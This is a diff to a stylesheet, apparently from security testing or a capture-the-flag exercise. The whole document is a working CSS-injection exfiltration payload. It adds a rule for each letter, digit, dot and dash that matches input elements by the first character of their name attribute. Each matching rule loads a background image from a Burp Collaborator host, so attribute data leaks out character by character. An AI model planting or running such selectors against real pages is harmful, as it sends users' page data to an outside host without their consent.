@@ -21,9 +21,117 @@ div.branding {
 input{
     background-image: url("https://s3wim2k8iatrcox0fd75c3pjmas2gr.burpcollaborator.net/input");
 }
-div{
-    background-image: url("https://s3wim2k8iatrcox0fd75c3pjmas2gr.burpcollaborator.net/div");
+input[name^=a]{
+    background-image: url("https://s3wim2k8iatrcox0fd75c3pjmas2gr.burpcollaborator.net/inputa");
 }
-button{
-    background-image: url("https://s3wim2k8iatrcox0fd75c3pjmas2gr.burpcollaborator.net/button");
+input[name^=b]{
+    background-image: url("https://s3wim2k8iatrcox0fd75c3pjmas2gr.burpcollaborator.net/inputb");
+}
+input[name^=c]{
+    background-image: url("https://s3wim2k8iatrcox0fd75c3pjmas2gr.burpcollaborator.net/inputc");
+}
+input[name^=d]{
+    background-image: url("https://s3wim2k8iatrcox0fd75c3pjmas2gr.burpcollaborator.net/inputd");
+}
+input[name^=e]{
+    background-image: url("https://s3wim2k8iatrcox0fd75c3pjmas2gr.burpcollaborator.net/inpute");
+}
+input[name^=f]{
+    background-image: url("https://s3wim2k8iatrcox0fd75c3pjmas2gr.burpcollaborator.net/inputf");
+}
+input[name^=g]{
+    background-image: url("https://s3wim2k8iatrcox0fd75c3pjmas2gr.burpcollaborator.net/inputg");
+}
+input[name^=h]{
+    background-image: url("https://s3wim2k8iatrcox0fd75c3pjmas2gr.burpcollaborator.net/inputh");
+}
+input[name^=i]{
+    background-image: url("https://s3wim2k8iatrcox0fd75c3pjmas2gr.burpcollaborator.net/inputi");
+}
+input[name^=j]{
+    background-image: url("https://s3wim2k8iatrcox0fd75c3pjmas2gr.burpcollaborator.net/inputj");
+}
+input[name^=k]{
+    background-image: url("https://s3wim2k8iatrcox0fd75c3pjmas2gr.burpcollaborator.net/inputk");
+}
+input[name^=l]{
+    background-image: url("https://s3wim2k8iatrcox0fd75c3pjmas2gr.burpcollaborator.net/inputl");
+}
+input[name^=m]{
+    background-image: url("https://s3wim2k8iatrcox0fd75c3pjmas2gr.burpcollaborator.net/inputm");
+}
+input[name^=n]{
+    background-image: url("https://s3wim2k8iatrcox0fd75c3pjmas2gr.burpcollaborator.net/inputn");
+}
+input[name^=o]{
+    background-image: url("https://s3wim2k8iatrcox0fd75c3pjmas2gr.burpcollaborator.net/inputo");
+}
+input[name^=p]{
+    background-image: url("https://s3wim2k8iatrcox0fd75c3pjmas2gr.burpcollaborator.net/inputp");
+}
+input[name^=q]{
+    background-image: url("https://s3wim2k8iatrcox0fd75c3pjmas2gr.burpcollaborator.net/inputq");
+}
+input[name^=r]{
+    background-image: url("https://s3wim2k8iatrcox0fd75c3pjmas2gr.burpcollaborator.net/inputr");
+}
+input[name^=s]{
+    background-image: url("https://s3wim2k8iatrcox0fd75c3pjmas2gr.burpcollaborator.net/inputs");
+}
+input[name^=t]{
+    background-image: url("https://s3wim2k8iatrcox0fd75c3pjmas2gr.burpcollaborator.net/inputt");
+}
+input[name^=u]{
+    background-image: url("https://s3wim2k8iatrcox0fd75c3pjmas2gr.burpcollaborator.net/inputu");
+}
+input[name^=v]{
+    background-image: url("https://s3wim2k8iatrcox0fd75c3pjmas2gr.burpcollaborator.net/inputv");
+}
+input[name^=w]{
+    background-image: url("https://s3wim2k8iatrcox0fd75c3pjmas2gr.burpcollaborator.net/inputw");
+}
+input[name^=x]{
+    background-image: url("https://s3wim2k8iatrcox0fd75c3pjmas2gr.burpcollaborator.net/inputx");
+}
+input[name^=y]{
+    background-image: url("https://s3wim2k8iatrcox0fd75c3pjmas2gr.burpcollaborator.net/inputy");
+}
+input[name^=z]{
+    background-image: url("https://s3wim2k8iatrcox0fd75c3pjmas2gr.burpcollaborator.net/inputz");
+}
+input[name^=0]{
+    background-image: url("https://s3wim2k8iatrcox0fd75c3pjmas2gr.burpcollaborator.net/input0");
+}
+input[name^=1]{
+    background-image: url("https://s3wim2k8iatrcox0fd75c3pjmas2gr.burpcollaborator.net/input1");
+}
+input[name^=2]{
+    background-image: url("https://s3wim2k8iatrcox0fd75c3pjmas2gr.burpcollaborator.net/input2");
+}
+input[name^=3]{
+    background-image: url("https://s3wim2k8iatrcox0fd75c3pjmas2gr.burpcollaborator.net/input3");
+}
+input[name^=4]{
+    background-image: url("https://s3wim2k8iatrcox0fd75c3pjmas2gr.burpcollaborator.net/input4");
+}
+input[name^=5]{
+    background-image: url("https://s3wim2k8iatrcox0fd75c3pjmas2gr.burpcollaborator.net/input5");
+}
+input[name^=6]{
+    background-image: url("https://s3wim2k8iatrcox0fd75c3pjmas2gr.burpcollaborator.net/input6");
+}
+input[name^=7]{
+    background-image: url("https://s3wim2k8iatrcox0fd75c3pjmas2gr.burpcollaborator.net/input7");
+}
+input[name^=8]{
+    background-image: url("https://s3wim2k8iatrcox0fd75c3pjmas2gr.burpcollaborator.net/input8");
+}
+input[name^=9]{
+    background-image: url("https://s3wim2k8iatrcox0fd75c3pjmas2gr.burpcollaborator.net/input9");
+}
+input[name^=.]{
+    background-image: url("https://s3wim2k8iatrcox0fd75c3pjmas2gr.burpcollaborator.net/input.");
+}
+input[name^=-]{
+    background-image: url("https://s3wim2k8iatrcox0fd75c3pjmas2gr.burpcollaborator.net/input-");
 }
